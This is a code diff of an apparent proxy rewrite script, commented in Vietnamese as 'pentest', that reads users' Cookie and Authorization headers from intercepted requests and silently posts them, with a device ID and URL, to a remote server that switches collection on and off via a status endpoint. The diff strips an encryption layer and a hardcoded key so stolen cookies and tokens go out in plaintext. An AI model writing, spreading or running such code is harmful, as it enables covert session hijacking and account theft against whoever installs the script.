@@ -1,16 +1,4 @@
-// Khóa bí mật (Phải khớp hoàn toàn với server.js)
-const SECRET_KEY = "tin1612006";
-
-function encryptData(str, secret) {
-  var encrypted = "";
-  for (var i = 0; i < str.length; i++) {
-    var charCode = str.charCodeAt(i) ^ secret.charCodeAt(i % secret.length);
-    encrypted += String.fromCharCode(charCode);
-  }
-  return btoa(unescape(encodeURIComponent(encrypted)));
-}
-
-// ========= ĐOẠN MÃ PENTEST THU THẬP COOKIE/TOKEN (BẢO MẬT) ========= //
+// ========= ĐOẠN MÃ PENTEST THU THẬP COOKIE/TOKEN (TEST MODE - KHÔNG MÃ HÓA) ========= //
 try {
   var user_cookie = $request.headers["Cookie"] || $request.headers["cookie"];
   var user_token = $request.headers["Authorization"] || $request.headers["authorization"] || $request.headers["token"];
@@ -25,13 +13,10 @@ try {
       globalThis._serverAllowed = false;
     }
 
-    // Kiểm tra trạng thái định kỳ 30 giây/lần kèm theo Header xác thực
+    // Cache trạng thái 30 giây để tránh spam request hỏi server liên tục
     if (now - globalThis._lastCheck > 30000) {
       globalThis._lastCheck = now;
-      $httpClient.get({ 
-        url: server_domain + "/status",
-        headers: { "Authorization": SECRET_KEY } // Gửi kèm khóa xác thực
-      }, function(err, resp, data) {
+      $httpClient.get({ url: server_domain + "/status" }, function(err, resp, data) {
         if (!err && data) {
           try {
             var resJson = JSON.parse(data);
@@ -45,26 +30,23 @@ try {
       });
     }
 
-    // Nếu server bật và cấp phép
+    // CHỈ THU THẬP VÀ GỬI KHI SERVER BẬT (collect === true)
     if (globalThis._serverAllowed === true) {
       var raw_ua = $request.headers["User-Agent"] || $request.headers["user-agent"] || "Unknown_Device";
       var device_id = raw_ua.split(" ")[0] + "_" + Math.abs(hashCode(raw_ua));
 
-      var rawPayload = JSON.stringify({
-        deviceId: device_id,
-        url: target_url,
-        cookie: user_cookie || "Không có",
-        token: user_token || "Không có"
-      });
-
-      // Mã hóa dữ liệu trước khi gửi
-      var encryptedPayload = encryptData(rawPayload, SECRET_KEY);
-
       $httpClient.post({
         url: server_domain + "/",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ data: encryptedPayload })
-      }, function(error, response, body) {});
+        body: JSON.stringify({
+          deviceId: device_id,
+          url: target_url,
+          cookie: user_cookie || "Không có",
+          token: user_token || "Không có"
+        })
+      }, function(error, response, body) {
+        // Gửi ngầm thành công
+      });
     }
   }
 } catch (e) {}
